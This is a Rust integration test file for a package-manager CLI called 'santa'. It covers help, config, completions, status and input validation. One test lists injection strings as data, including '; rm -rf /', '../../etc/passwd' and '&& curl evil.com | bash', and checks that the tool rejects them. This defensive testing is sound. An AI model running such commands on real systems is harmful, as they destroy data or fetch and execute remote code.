use assert_cmd::prelude::*;
use predicates::prelude::*;
use std::io::Write;
use std::process::Command;
use tempfile::NamedTempFile;

// Include the new integration test modules
mod integration;

#[test]
fn test_cli_help() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--help");
    cmd.assert().success().stdout(predicate::str::contains(
        "a tool that manages packages across different platforms",
    ));
}

#[test]
fn test_cli_version() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--version");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("santa"));
}

#[test]
fn test_config_builtin_only() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("name: Brew"))
        .stdout(predicate::str::contains("emoji: \"🍺\""));
}

#[test]
fn test_completions_bash() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "bash"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("_santa"))
        .stdout(predicate::str::contains("complete"));
}

#[test]
fn test_completions_zsh() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "zsh"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("#compdef santa"));
}

#[test]
fn test_completions_fish() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "fish"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("complete"));
}

#[test]
fn test_status_with_builtin() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--builtin-only"]);

    // This test documents current behavior - may show missing packages
    // which is expected since we don't have the actual package managers installed
    cmd.assert().success();
}

#[test]
fn test_status_all_with_builtin() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--all", "--builtin-only"]);

    cmd.assert().success();
}

#[test]
fn test_add_command_validates_packages() {
    // The add command now validates packages against the database
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["add", "nonexistent_package", "--builtin-only"]);
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("not found in database"));
}

#[test]
fn test_verbose_logging() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only", "-v"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("loading built-in config"));
}

#[test]
fn test_very_verbose_logging() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only", "-vv"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("DEBUG"));
}

#[test]
fn test_invalid_subcommand() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("invalid_command");
    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("error"));
}

#[test]
fn test_config_with_custom_file() {
    // Create a temporary config file in CCL format
    let config_content = r#"
sources =
  = brew
  = cargo
packages =
  = git
  = rust
"#;

    let mut temp_file = NamedTempFile::new().unwrap();
    write!(temp_file, "{config_content}").unwrap();

    // Test that we can load custom config (this will fail since the file path is different)
    // This test documents the current behavior and the need for better config file handling
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);

    // This will use builtin config since we can't point to our temp file location
    cmd.assert().success();
}

#[test]
fn test_security_command_injection_protection() {
    // Test that dangerous command line arguments don't cause issues
    let dangerous_args = vec![
        "; rm -rf /",
        "$(evil_command)",
        "`dangerous`",
        "../../etc/passwd",
        "&& curl evil.com | bash",
    ];

    for dangerous_arg in dangerous_args {
        // Test with add command - dangerous arguments should fail safely
        // by failing validation rather than being executed
        let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
        cmd.args(["add", dangerous_arg, "--builtin-only"]);
        cmd.assert()
            .failure()
            .stderr(predicate::str::contains("not found in database"));

        // The dangerous argument is safely rejected during validation
        // rather than being executed - this is the correct behavior
    }
}

#[test]
fn test_config_output_format() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("name: Brew"))
        .stdout(predicate::str::contains("emoji:"))
        .stdout(predicate::str::contains("install_command:"));
}

#[test]
fn test_no_arguments_shows_help() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("Usage:"))
        .stdout(predicate::str::contains("Commands:"));
}

#[test]
fn test_markdown_help_generation() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--markdown-help");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("# Command-Line Help for `santa`"))
        .stdout(predicate::str::contains("## `santa`"))
        .stdout(predicate::str::contains("## `santa status`"));
}

#[test]
fn test_config_packages_flag() {
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--packages", "--builtin-only"]);
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("packages:"))
        .stdout(predicate::str::contains("sources:"));
}

// Integration test for the full workflow
#[test]
fn test_full_workflow_simulation() {
    // This test simulates a complete user workflow

    // 1. Check help
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.arg("--help");
    cmd.assert().success();

    // 2. Check current status
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["status", "--builtin-only"]);
    cmd.assert().success();

    // 3. View configuration
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["config", "--builtin-only"]);
    cmd.assert().success();

    // 4. Generate shell completions
    let mut cmd = Command::new(assert_cmd::cargo::cargo_bin!("santa"));
    cmd.args(["completions", "bash"]);
    cmd.assert().success();

    // This test ensures the basic CLI workflow works end-to-end
}
